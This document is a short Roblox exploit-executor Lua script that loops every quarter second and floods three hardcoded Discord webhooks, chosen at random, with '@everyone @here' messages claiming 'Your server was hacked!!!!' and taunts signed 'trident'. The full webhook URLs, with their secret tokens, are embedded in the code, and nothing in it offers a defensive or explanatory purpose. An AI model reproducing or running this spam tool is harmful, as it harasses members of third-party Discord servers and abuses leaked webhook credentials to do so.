while task.wait(0.25) do
    task.spawn(function()
        -- Creating Webhook Data
        local function createWebhookData()
            local data = {
        ["content"]="@everyone @here",
        ["embeds"]={{
            ["title"]="Your server was hacked!!!!",
            ["description"]="trident owns u!!!!!!!\nget haxed!!!!! trident pro hax0r\nhahahhaa\nhaxed\nhax0r\nlollll",
            ["color"]=nil,
            ["thumbnail"]={
                ["url"]="https://static.wikia.nocookie.net/minecraft_gamepedia/images/0/02/Enchanted_Trident_%28item%29.gif/revision/latest?cb=20201120003800"
            }
            }},
        ["attachments"]={}
        }
            return game:GetService("HttpService"):JSONEncode(data)
        end

        -- Sending Webhook
        local function sendWebhook(webhookUrl, data)
            local headers = {
                ["content-type"] = "application/json",
            }

            local request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(abcdef)
        end

        -- Replace the webhook URL with your own URL
        local webhookUrl = ({"https://discord.com/api/webhooks/1349590381888802877/rqRHFKcRyK5KSdD0nVfeBwP169oW-PQx4175kSZIpiGQ5QM1joL3lNEZkxkZxVREcjJc", "https://discord.com/api/webhooks/1349592295393067109/tDMxKBl9ZaIjr1xEj8Vzm4xEZqDg-hWQ-LqNgdt1VlHfiXt2rlX2jtZEXU-I6gC8BNNl", "https://discord.com/api/webhooks/1349592356977901618/EVnlBIgJqFyZUDMQE6TTItFGs0zi6tAY3bRUzIAnkZcA_d7QOyfVQ-HdM70VQr47eJQV"})[math.random(1,3)]
        local webhookData = createWebhookData()

        -- Sending the webhook
        sendWebhook(webhookUrl, webhookData)
        print(webhookUrl)
    end)
end
